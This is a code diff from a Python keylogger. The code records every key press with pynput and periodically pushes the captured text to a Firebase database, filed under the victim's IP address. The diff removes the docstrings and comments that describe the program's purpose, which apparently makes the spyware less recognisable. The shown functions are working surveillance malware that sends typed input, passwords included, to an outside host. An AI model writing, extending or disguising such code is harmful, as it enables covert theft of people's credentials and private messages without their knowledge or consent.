@@ -62,18 +62,18 @@ def process_key_press(key):
             log += f" [{str(key)}] "
 
 def firebase(log_data):
-    """Sends the log data to Firebase under the user's sanitized IP address."""
+   
     try:
-        ref = db.reference(f'key_logs/{user_ip}')  # Use sanitized IP
+        ref = db.reference(f'key_logs/{user_ip}') 
         ref.push({'log': log_data})
-        #print(f"Log sent to Firebase under IP {user_ip}.")
+        
     except Exception as e:
         pass
         print(f"Failed to download: {e}")
         print("RESTARTING")
 
 def report():
-    """Reports log data to Firebase periodically."""
+   
     global log
     if log:
         firebase(log)
@@ -83,7 +83,7 @@ def report():
 
 def start():
     """Starts the keylogger."""
-    #print(f"Keylogger started for IP: {user_ip}. Listening for key presses...")
+    #print(f"{user_ip}. start")
     keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
     with keyboard_listener:
         report()
